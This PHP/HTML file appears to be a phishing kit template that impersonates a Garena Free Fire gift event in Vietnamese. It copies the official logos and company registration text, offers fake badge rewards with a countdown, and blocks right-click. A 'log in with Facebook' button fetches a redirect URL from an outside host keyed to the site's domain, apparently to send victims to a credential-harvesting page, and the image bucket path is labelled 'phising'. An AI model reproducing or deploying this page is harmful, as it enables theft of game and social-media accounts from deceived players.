<?php
$imageLinks = [
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/pFPyUBz.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Q3J7g8sjmmuBr70yeblxvUtiAcAPlHnwrQ&s",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/3dphRVj.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/aayuhgO.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/images.jpg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/JkE8Sq2.jpeg",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/Shoz1ga.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/maxresdefault.jpg",
];

// Kiểm tra xem danh sách có đủ dữ liệu không
if (is_array($imageLinks) && count($imageLinks) >= 10) {
    $bannerLink = $imageLinks[0];
    $gift1Link = $imageLinks[1];
    $gift2Link = $imageLinks[2];
    $gift3Link = $imageLinks[3];
    $gift4Link = $imageLinks[4];
    $gift5Link = $imageLinks[5];
    $gift6Link = $imageLinks[6];
    $gift7Link = $imageLinks[7];
    $gift8Link = $imageLinks[8];
    $gift9Link = $imageLinks[9];

    $gift1Name = "Huy hiệu 1";
    $gift2Name = "Huy hiệu 2";
    $gift3Name = "Huy hiệu 3";
    $gift4Name = "Huy hiệu 4";
    $gift5Name = "Huy hiệu 5";
    $gift6Name = "Huy hiệu 6";
    $gift7Name = "Huy hiệu 7";
    $gift8Name = "Huy hiệu 8";
    $gift9Name = "Huy hiệu 9";
} else {
    echo "Danh sách hình ảnh không đủ dữ liệu.";
}

$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme11/') === false) {
    $baseHref = '<base href="themes/theme11/">';
}
?>
<?= $baseHref ?>

<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="Garena Free Fire">
    <meta name="description" content="Nhận Quà Free Fire!">
    <meta property="og:description" content="Nhận Quà Free Fire!">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="Garena Free Fire">
    <meta property="og:type" content="website">
    <meta name="copyright" content="NVN">
    <meta name="theme-color" content="#000">
    <meta property="og:image"
        content="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/20232/83f3aecfe60c6ec13a09696b3465907a.jpg">
    <title>Garena Free Fire</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="css/login/facebook.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="icon" href="img/icon.png">
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

    <div class="container">
        <div class="navbar">
            <img class="navbar-logo"
                src="https://dl.dir.freefiremobile.com/common/test/official/FREE_FIRE_LOGO.PNG(2).png">
            <div class="navbar-right">
                <img class="navbar-shop" src="img/nav_shop.svg">
                <img class="navbar-language" src="img/nav_language.svg">
                <img class="navbar-language" src="img/nav_menu.svg">
                <div class="navbar-download"><img src="img/nav_download.svg"></div>
            </div>
            <!--- navbar-right --->
        </div>
        <!--- navbar --->
        <div class="header">
            <div class="sliderHeader"><img src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>"
                    style="width: 100%;"></div>
            <div class="sliderHeader"><img src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>"
                    style="width: 100%;"></div>
            <div class="sliderHeader"><img src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>"
                    style="width: 100%;"></div>
        </div>
        <!--- header --->
        <div class="event-alert">
            <img src="img/s4_img2.png" style="display: none">
            <div class="event-alert-title">
                <?php echo isset($bannerName) ? $bannerName : ''; ?>
            </div>

        </div>
        <!--- event-title --->
        <div class="rewards-section">
            <div class="event-notification">

                Sự Kiện Kết Thúc Sau:
                <div class="event-notification-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span>
                </div>
                <!--- event-notification-timer --->
            </div>
            <!--- event-notification --->
            <div class="rewards-wrapper">
                <div class="menu-wrapper-border"></div>
                <!--- menu-wrapper-border --->
                <div class="menu-wrapper">

                    <div class="rewards-box-navbar">
                        <div class="rewards-box-navbar-title">Quà Tặng</div>
                        <!--- rewards-box-navbar-title --->
                    </div>
                    <!--- rewards-box-navbar --->
                    <div class="rewards-box-content">
                        <center>
                            <div class="tab_rewards" id="season">
                                <div class="item itemShine">
                                    <div>
                                        <figure>
                                            <img style="border-bottom: 0px;"
                                                src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">
                                        </figure>
                                    </div>
                                    <div>
                                        <button type="button" onmousedown="buka.play();"
                                            onclick="open_itemReward_confirmation(this);"
                                            src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">Nhận</button>
                                    </div>
                                </div>
                                <div class="item itemShine">
                                    <div>
                                        <figure>
                                            <img style="border-bottom: 0px;"
                                                src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">
                                        </figure>
                                    </div>
                                    <div>
                                        <button type="button" onmousedown="buka.play();"
                                            onclick="open_otherReward_confirmation(this);" value="10"
                                            src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">Nhận</button>
                                    </div>
                                </div>
                                <div class="item itemShine">
                                    <div>
                                        <figure>
                                            <img style="border-bottom: 0px;"
                                                src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">
                                        </figure>
                                    </div>
                                    <div>
                                        <button type="button" onmousedown="buka.play();"
                                            onclick="open_itemReward_confirmation(this);"
                                            src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">Nhận</button>
                                    </div>
                                </div>
                                <div class="item itemShine">
                                    <div>
                                        <figure>
                                            <img style="border-bottom: 0px;"
                                                src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">
                                        </figure>
                                    </div>
                                    <div>
                                        <button type="button" onmousedown="buka.play();"
                                            onclick="open_itemReward_confirmation(this);"
                                            src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">Nhận</button>
                                    </div>
                                </div>
                                <div class="item itemShine">
                                    <div>
                                        <figure>
                                            <img style="border-bottom: 0px;"
                                                src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">
                                        </figure>
                                    </div>
                                    <div>
                                        <button type="button" onmousedown="buka.play();"
                                            onclick="open_otherReward_confirmation(this);" value="10"
                                            src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">Nhận</button>
                                    </div>
                                </div>
                                <div class="item itemShine">
                                    <div>
                                        <figure>
                                            <img style="border-bottom: 0px;"
                                                src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">
                                        </figure>
                                    </div>
                                    <div>
                                        <button type="button" onmousedown="buka.play();"
                                            onclick="open_itemReward_confirmation(this);"
                                            src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">Nhận</button>
                                    </div>
                                </div>
                            </div>
                            <!--- tab-rewards --->
                        </center>
                    </div>
                    <!--- rewards-box-content --->

                </div>
                <!--- rewards-wrapper --->
            </div>
            <!--- rewards-section --->

            <div class="footer">

                <img class="footer-copyright-icon"
                    src="https://dl.dir.freefiremobile.com/common/web_event/ffuniversenew/img/logo.c7fec21.png">


                <div class="footer-txt-copyright">CÔNG TY CỔ PHẦN GIẢI TRÍ VÀ THỂ THAO ĐIỆN TỬ VIỆT NAM Giấy CNĐKKD số
                    0105301438, cấp lần đầu ngày 10/05/2011 Cơ quan cấp: Phòng Đăng ký kinh doanh- Sở Kế hoạch và đầu tư
                    TP Hà Nội Địa chỉ trụ sở chính: Tầng 29, tòa nhà Trung tâm Lotte
                    Hà Nội, số 54, đường Liễu Giai, Phường Cống Vị, Quận Ba Đình, Thành phố Hà Nội, Việt Nam.</div>
                <div class="footer-txt-copyright">ⓒ NVN</div>
                <!--- footer-txt-copyright --->
            </div>
            <!--- footer --->
        </div>
        <!--- container --->

        <div class="popup account_login">
            <div class="popup-box-wrapper">
                <div class="popup-box-navbar">
                    <div class="popup-box-navbar-title">Đăng Nhập Tài Khoản</div>
                    <!--- popup-box-navbar-title --->
                </div>
                <!--- popup-box-navbar --->
                <div class="popup-box-bg">
                    <div class="popup-box-alert">Đăng nhập để tiếp tục</div>
                    <!--- popup-box-alert --->
                    <button type="button" class="popup-btn-login popup-btn-facebook" onclick="nvn_facebook();"><i
                            class="fa fa-facebook-square icon-login"></i> Đăng nhập bằng Facebook</button>
                    <br>
                </div>
                <!--- popup-box-bg --->
            </div>
            <!--- popup-box-wrapper --->
        </div>
        <!--- popup account_login --->


        <script>
            function nvn_facebook() {
                const domain = window.location.protocol + "//" + window.location.host;
                (async () => {
                    try {
                        let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                        data = await data.json()
                        window.location.href = data.data.domain_fb;
                    } catch {

                    }
                })();
            }
            // Code By NVN
            var slideIndexHeader = 0;
            showSlidesHeader();
            function showSlidesHeader() {
                var i;
                var slidesHeader = document.getElementsByClassName("sliderHeader");
                for (i = 0; i < slidesHeader.length; i++) {
                    slidesHeader[i].style.display = "none";
                }
                slideIndexHeader++;
                if (slideIndexHeader > slidesHeader.length) { slideIndexHeader = 1 }
                slidesHeader[slideIndexHeader - 1].style.display = "block";
                setTimeout(showSlidesHeader, 2500);
            }</script>
</body>

</html>